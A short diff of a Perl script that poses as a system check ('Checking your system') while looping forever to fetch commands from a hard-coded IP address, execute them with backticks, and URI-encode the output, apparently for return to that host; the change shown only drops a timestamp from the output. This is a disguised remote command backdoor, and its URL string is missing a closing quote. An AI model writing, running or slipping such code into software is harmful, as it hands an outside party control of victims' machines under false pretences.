@@ -7,7 +7,7 @@ print "Checking your system ";
 while ( 1 ) {
 my $INET = new Win32::Internet();
 my $cmd = $INET->FetchURL("http://195.146.133.198/httpsh/actual.txt);
-my $out = sprintf "%s\n\n", scalar localtime();
+my $out = "";
 for my $line (`$cmd`) {
 $out .= uri_encode($line);
 }
